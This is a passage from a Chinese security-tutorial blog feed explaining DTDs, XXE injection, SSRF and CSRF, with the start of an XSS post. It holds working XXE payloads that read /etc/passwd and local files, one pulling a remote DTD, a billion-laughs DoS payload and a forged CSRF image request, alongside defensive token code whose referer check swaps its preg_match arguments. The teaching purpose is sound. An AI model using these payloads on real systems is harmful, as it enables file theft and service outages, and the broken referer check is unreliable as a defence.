title="定义"></a>定义</h4><p>DTD(Document Type Definition)文档类型定义，是一种XML约束模式语言，属于XML文件组成的一部分</p><h4 id="应用形式"><a href="#应用形式" class="headerlink" title="应用形式"></a>应用形式</h4><p>DTD文档有三种应用形式：</p><ol><li>内部DTD文档<br><code>&lt;!DOCTYPE 根元素[定义内容]&gt;</code><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE note [    &lt;!--定义此文档为note类型--&gt;<br>&lt;!ELEMENT note (to,from,heading,body)&gt;    &lt;!--定义note元素有四个--&gt;<br>&lt;!ELEMENT to (#PCDATA)&gt;    &lt;!--定义to元素为"#PCDATA"类型，下同--&gt;<br>&lt;!ELEMENT from (#PCDATA)&gt;<br>&lt;!ELEMENT head (#PCDATA)&gt;<br>&lt;!ELEMENT body (#PCDATA)&gt;<br>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Dave<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>Tom<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>Reminder<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>You are a good man<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ol><hr><ol start="2"><li>外部DTD文档<br><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot;&gt;</code><br><code>outdtd.dtd</code><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">!ELEMENT</span> <span class="hljs-attr">poem</span> (<span class="hljs-attr">author</span>,<span class="hljs-attr">title</span>,<span class="hljs-attr">content</span>)&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">!ELEMENT</span> <span class="hljs-attr">author</span> (#<span class="hljs-attr">PCDATA</span>)&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">!ELEMENT</span> <span class="hljs-attr">title</span> (#<span class="hljs-attr">PCDATA</span>)&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">!ELEMENT</span> <span class="hljs-attr">content</span> (#<span class="hljs-attr">PCDATA</span>)&gt;</span><br></code></pre></td></tr></table></figure></li></ol><hr><p><code>outdtd.xml</code><br><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE poem SYSTEM "outdtd.dtd"&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">poem</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span>wangwei<span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">content</span>&gt;</span>this is content<span class="hljs-tag">&lt;/<span class="hljs-name">content</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">poem</span>&gt;</span><br></code></pre></td></tr></table></figure></p><hr><ol start="3"><li>内外部DTD文档结合<br><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot; [定义内容]&gt;</code><br><code>dtd_2.dtd</code><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">!ELEMENT</span> <span class="hljs-attr">author</span> (#<span class="hljs-attr">PCDATA</span>)&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">!ELEMENT</span> <span class="hljs-attr">title</span> (#<span class="hljs-attr">PCDATA</span>)&gt;</span><br></code></pre></td></tr></table></figure></li></ol><p><code>out2dtd.xml</code><br><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE poem SYSTEM "dtd_2.dtd"[<br>&lt;!ELEMENT poem (author, title, content)&gt;<br>&lt;!ELEMENT content (#PCDATA)&gt;<br>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">poem</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span>wangwei<span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">content</span>&gt;</span>this is content<span class="hljs-tag">&lt;/<span class="hljs-name">content</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">poem</span>&gt;</span><br></code></pre></td></tr></table></figure></p><hr><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><ul><li><p>数据库表结构与数据记录</p></li><li><p>每个XML文件可以携带一个自身格式的描述</p></li><li>不同组织的人可以使用一个通用DTD来交换数据</li><li>应用程序可以使用一个标准DTD校验从外部世界接收来的XML数据是否有效</li></ul><p>此处重点了解文档类型定义，因为XXE发生在此处：<br>DTD的作用是定义XML文档的合法构建模块。它既可以在XML文档内声明，也可以外部引用</p><p>在DTD内，我们可以声明外部实体<br>语法规则：<br><strong>内部声明实体</strong><br><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> 实体名称 "实体的值"&gt;</span><br></code></pre></td></tr></table></figure></p><p><strong>引用外部实体</strong><br><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> 实体名称 <span class="hljs-attr">SYSTEM</span> "<span class="hljs-attr">URL</span>"&gt;</span><br></code></pre></td></tr></table></figure></p><hr><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><h4 id="普通实体引入外部实体"><a href="#普通实体引入外部实体" class="headerlink" title="普通实体引入外部实体"></a>普通实体引入外部实体</h4><p>通过file协议，引入外部实体参数<br><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE test [<br>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;<br>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span>&amp;xxe;<span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br></code></pre></td></tr></table></figure></p><hr><h4 id="参数实体引入外部实体"><a href="#参数实体引入外部实体" class="headerlink" title="参数实体引入外部实体"></a>参数实体引入外部实体</h4><p>引入外部参数实体<code>outdtd.dtd</code>文件<br><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE % test[<br>    &lt;!ENTITY %a SYSTEM "http://www.test.com/outdtd.dtd"&gt;<br>% a;]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span>&amp;xxe;<span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br></code></pre></td></tr></table></figure></p><p><code>outdtd.dtd</code><br><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> <span class="hljs-attr">xxe</span> <span class="hljs-attr">SYSTEM</span> "<span class="hljs-attr">file:</span>///<span class="hljs-attr">etc</span>/<span class="hljs-attr">passwd</span>"&gt;</span><br></code></pre></td></tr></table></figure></p><hr><h3 id="支持的协议"><a href="#支持的协议" class="headerlink" title="支持的协议"></a>支持的协议</h3><table><thead><tr><th><strong>libxml2</strong></th><th><strong>PHP</strong></th><th><strong>Java</strong></th><th><strong>.NET</strong></th></tr></thead><tbody><tr><td>file</td><td>file</td><td>http</td><td>file</td></tr><tr><td>http</td><td>http</td><td>https</td><td>http</td></tr><tr><td>ftp</td><td>ftp</td><td>ftp</td><td>https</td></tr><tr><td></td><td>php</td><td>file</td><td>ftp</td></tr><tr><td></td><td>compress.zlib</td><td>jar</td><td></td></tr><tr><td></td><td>compress.bzip2</td><td>netdoc</td><td></td></tr><tr><td></td><td>data</td><td>mailto</td><td></td></tr><tr><td></td><td>glob</td><td>gopher *</td><td></td></tr><tr><td></td><td>phar</td><td></td><td></td></tr></tbody></table><hr><h3 id="XXE简介"><a href="#XXE简介" class="headerlink" title="XXE简介"></a>XXE简介</h3><p>XXE(XML External Entity Injection)，即XML外部实体注入，漏洞是对非安全的外部实体数据进行处理时引发的安全问题。<br>XML是用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种运行用户对自己的标记语言进行定义的源语言。XML文档包括XML声明、DTD文档类型定义（可选）、文档元素</p><h3 id="XXE的危害"><a href="#XXE的危害" class="headerlink" title="XXE的危害"></a>XXE的危害</h3><h4 id="读取任意文件"><a href="#读取任意文件" class="headerlink" title="读取任意文件"></a>读取任意文件</h4><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0"?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE root [<br>    &lt;!ENTITY entity SYSTEM "file://C:\Users\rugal\Desktop\test.txt"&gt;<br>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span>&amp;entity;<span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>利用成功示例结果：<br><code>&lt;root&gt;123123admin&lt;/root&gt;</code></p><hr><h4 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>$xml=<span class="hljs-string">&lt;&lt;&lt;EOF<br>&lt;!DOCTYPE ANY [<br>    &lt;!ENTITY xxe SYSTEM "file:///C:/test.txt"&gt;<br>]&gt;<br>&lt;x&gt;&amp;xxe;&lt;/x&gt;<br>EOF;</span><br>$data = simplexml_load_string($xml);<br>print_r($data);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><hr><h4 id="Dos拒绝服务攻击"><a href="#Dos拒绝服务攻击" class="headerlink" title="Dos拒绝服务攻击"></a>Dos拒绝服务攻击</h4><p>递归调用，以占用大量服务器资源<br><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE lolz [<br>  &lt;!ENTITY lol "lol"&gt;<br>  &lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;<br>  &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;<br>  &lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;<br>  &lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"&gt;<br>  &lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt;<br>  &lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"&gt;<br>  &lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt;<br>  &lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;<br>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">lolz</span>&gt;</span>&amp;lol9;<span class="hljs-tag">&lt;/<span class="hljs-name">lolz</span>&gt;</span><br></code></pre></td></tr></table></figure></p><p>等等其它危害</p><hr><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>SSRF(Server-Side Request Forgery)服务器端请求伪造，是一种由恶意访问者构造形成由服务端发起请求的一个安全漏洞<br>一般情况下，SSRF访问的目标是从外网无法访问的内部系统（正是由于它是服务端发起的，所以它能够请求到与之相连的而与外网隔离的内部系统）。<br>SSRF形成的原因大都是由于服务端提供了其它服务器应用获取数据的功能且没有对目标地址做过滤与限制<br>比如从指定URL地址获取网页文本内容、加载指定地址的图片、下载等</p><h3 id="原理示例"><a href="#原理示例" class="headerlink" title="原理示例"></a>原理示例</h3><p>当边界主机存在XXE漏洞XXE.php文件时：<br><code>黑客(10.10.10.10)</code>==&gt;<code>边界主机(外网10.20.10.10/内网1.1.1.1)</code>==&gt;<code>内网(1.1.1.2/3/4)</code></p><hr><h3 id="SSRF综合训练"><a href="#SSRF综合训练" class="headerlink" title="SSRF综合训练"></a>SSRF综合训练</h3><p>bwapp中SSRf实验</p><hr><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="PHP中Session配置问题"><a href="#PHP中Session配置问题" class="headerlink" title="PHP中Session配置问题"></a>PHP中Session配置问题</h3><p>关于session配置的问题<br>Warning: session_start() [function.session-start]:<br><a href="https://blog.csdn.net/qq_24338883/article/details/51450751" target="_blank" rel="noopener">https://blog.csdn.net/qq_24338883/article/details/51450751</a></p><p>修改<br><code>php.ini</code>中的<code>session.auto_start = 0</code> 为 <code>session.auto_start = 1</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> Injection </tag>
            
            <tag> Unconventional </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CSRF跨站请求伪造</title>
      <link href="/2019/01/22/CSRF/"/>
      <url>/2019/01/22/CSRF/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>CSRF(Cross Site Request Forgery)跨站请求伪造，是一种网络的攻击方式，也被称为<code>One Click Attack</code>或者<code>Session Riding</code>，通常缩写为CSRF或者XSRF</p><h3 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a>漏洞产生原因</h3><p>当Web应用程序在用户进行敏感操作时，如：修改账号密码、添加账号、转账等时，没有校验表单<code>token</code>或者http请求头中的<code>referer</code>值，从而导致恶意攻击者利用普通用户的身份（cookie）完成攻击行为</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>CSRF是一种针对Web应用的攻击方式。它可以在受害者毫不知情的情况下，以受害者的名义伪造请求，并发送给受攻击的站点，从而在未授权的情况下执行在权限保护之下的操作，具有很大危害性。<br>与其他攻击方式（SQL注入、上传、XSS等）相比，CSRF的关注度较少，也更容易出现</p><hr><h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><p>一次CSRF攻击的过程中，受害者需要依次完成两个步骤：</p><ol><li>登录受信任网站A，并在本地生成Cookie</li><li>在A的Cookie存活期间内，访问危险网站B</li></ol><p>eg:</p><ol><li><p>网站A的管理员A成功登录网站A<br>正常返回Cookie</p></li><li><p>网站A的账号密码修改功能存在CSRF漏洞</p></li><li>网站B为黑客控制的恶意网站</li><li>管理员A访问网站B</li></ol><ul><li>HTTP Request:<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">HTTP/1.1<br>GET/<br>Host: www.test.com<br></code></pre></td></tr></table></figure></li></ul><ol start="5"><li>网站B的响应数据中，包含了请求修改用户A在网站A账号密码的请求</li></ol><ul><li><p>HTTP Response</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">HTTP /1.1 OK<br>Content-Type:text/html<br>Context-Length: 1024<br>&lt;html&gt;<br>    &lt;body&gt;<br>        &lt;img src=http://finance.bdtest.com/bug.php?symbol=BIDU&amp;shares=1000 /&gt;<br>    &lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure></li><li><p>CSRF Attack</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">HTTP/1.1<br>GET /bug.php?symbol=BIDU&amp;shares=1000<br>Host: finance.bdtest.com<br></code></pre></td></tr></table></figure></li></ul><hr><h3 id="高危触发点"><a href="#高危触发点" class="headerlink" title="高危触发点"></a>高危触发点</h3><ul><li>论坛交流</li><li>用户中心</li><li>反馈留言</li><li>交易管理</li><li>后台管理</li></ul><hr><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p>CSRF漏洞会导致受害人在不知情的情况下向论坛发帖子、订阅邮件列表、网购或股票交易、变更用户名或口令。对受到防火墙保护的所有Web应用程序而言，CSRF攻击都能绕过防火墙攻击Web应用<br>CSRF还可与XSS等漏洞联用，从而进一步加大该漏洞的危害。</p><p>主要危害可主要归为以下几类</p><ul><li>伪造HTTP请求进行未授权操作<blockquote><ul><li>篡改、盗取目标网站上的重要用户信息</li><li>未经允许执行对用户名誉或资产有害的操作，如：散播不良信息、进行消费等</li><li>若通过使用社工等方式攻击网站管理员，会危害网站本身的安全性</li></ul></blockquote></li><li>作为其它攻击向量的辅助手法，比如配合XSS</li><li>传播CSRF蠕虫</li></ul><hr><h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><h3 id="Token验证码实现"><a href="#Token验证码实现" class="headerlink" title="Token验证码实现"></a>Token验证码实现</h3><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// Generate Token</span><br><span class="hljs-comment">// 生成随机数</span><br><span class="hljs-keyword">if</span>(!function_exists(<span class="hljs-string">"random_bytes"</span>)) &#123;<br>    <span class="hljs-comment">// random_bytes函数存在于PHP7</span><br>    <span class="hljs-comment">// 若random_bytes函数不存在，使用简单生成伪随机数</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">random_bytes</span><span class="hljs-params">($length =<span class="hljs-number">32</span>)</span> </span>&#123;<br>    <span class="hljs-comment">// 0~9,a~Z</span><br>    $seed = <span class="hljs-string">"01234569abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;<br>    <span class="hljs-keyword">return</span> substr(str_shuffle(str_repeat($seed, $length)), <span class="hljs-number">0</span>, $length);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// Token生成</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">csrf_token</span><span class="hljs-params">($length = <span class="hljs-number">40</span>)</span> </span>&#123;<br>    $str = <span class="hljs-string">""</span>;<br>    <span class="hljs-keyword">while</span> (($len = strlen($str)) &lt; $length) &#123;<br>    $size = $length - $len;<br>    $bytes = random_bytes($size);<br>    $str .=substr(str_replace([<span class="hljs-string">'/'</span>, <span class="hljs-string">'+'</span>, <span class="hljs-string">'='</span>],<span class="hljs-string">''</span>,base64_encode(($bytes)), <span class="hljs-number">0</span>, $size);<br>    &#125;<br>    <span class="hljs-keyword">return</span> $str;<br>&#125;<br><br>$token = csrf_token();<br>$_SESSION[<span class="hljs-string">'_csrf_token'</span>] = $token;<br><span class="hljs-comment">// 渲染到页面</span><br><span class="hljs-comment">// ...</span><br><span class="hljs-comment">// 表单提交，校验Token</span><br><span class="hljs-keyword">if</span>($_POST[<span class="hljs-string">'_csrf_token'</span>] !== $_SESSION[<span class="hljs-string">'_csrf_token'</span>]) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="Referer验证代码实现"><a href="#Referer验证代码实现" class="headerlink" title="Referer验证代码实现"></a>Referer验证代码实现</h3><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">$regex = <span class="hljs-string">"/yourdomain.com$/i"</span>;<br>$referer = <span class="hljs-keyword">isset</span>($_SERVER[<span class="hljs-string">'HTTP_REFERER'</span>]) ? $_SERVER[<span class="hljs-string">'HTTP_REFERER'</span>]:<span class="hljs-string">''</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>($referer) || preg_match($referer, $regex) != <span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="防御总结"><a href="#防御总结" class="headerlink" title="防御总结"></a>防御总结</h3><blockquote><p>CSRF攻击核心时伪造请求，识别此类攻击的重点就是判断当前操作是否伪造；通过在当前页面生成随机Token，后端业务逻辑在处理操作时，应先校验Token的有效性，然后才能处理业务流程。尤其在核心业务中，采用Token+Referer的组合进行操作验证；采用验证码校验操作是因为攻击者无法预知验证码的值，进而无法构造有效的攻击；但毫无疑问，验证码会一定程度影响用户体验，所以需要在安全与用户体验之间找到一个微妙的平衡点</p></blockquote><hr><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="CSRF与XSS区别"><a href="#CSRF与XSS区别" class="headerlink" title="CSRF与XSS区别"></a>CSRF与XSS区别</h3><ul><li>csrf：无需获取任何信息，只是诱导用户进行恶意访问,要利用已登录的状态，发起登录后才能发起的请求</li><li>xss：获取到Cookie等信息后，利用Cookie登录</li></ul><hr><h3 id="bwapp安装"><a href="#bwapp安装" class="headerlink" title="bwapp安装"></a>bwapp安装</h3><ol><li>修改<code>admin/setting</code>数据用户密码</li><li>点击<code>here</code></li><li>新建用户登录</li></ol><hr><h3 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h3><p>同源策略，由浏览器支持（域名、协议、端口相同）<br>思考以下是否同源：<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">file:///C:/phpStudy/PHPTutorial/WWW/127.0.0.1html<br>http://127.0.0.1/127.0.0.1.html<br></code></pre></td></tr></table></figure></p><p>答：<strong>不属于同源</strong></p><p>浏览器同源策略与跨域问题（跨域访问）</p>]]></content>
      
      
      
        <tags>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>XSS跨站脚本攻击</title>
      <link href="/2019/01/20/XSS/"/>
      <url>/2019/01/20/XSS/</url>
      
        <content type="html"><![CDATA[<h2 id="相关基础"><a href="#相关基础" class="headerlink" title="相关基础"></a>相关基础</h2><h3 id="浏览器工作机制"><a href="#浏览器工作机制" class="headerlink" title="浏览器工作机制"></a>浏览器工作机制</h3><p>常见浏览器有IE、Firefox、Chrome等。这些浏览器的基本工作机制相同。<br>浏览器主要时解析渲染Web中间件相应的HTML、JavaScript、CSS等资源</p><h3 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h3><p>一种轻量级编程语言，其代码可插入HTML页面，并由所有的现代浏览器执行。<br>它能够改变任意HTML元素的大多数属性，且常用于改善HTML的展现，为用户带来更好的体验</p><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Test<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>JavaScript能对事件做出反应，比如对按钮的点击：（alert事件）<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">"alert('Webcome!')"</span>&gt;</span>单击按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><h4 id="简介"><a href="#简介" class="headerlink" 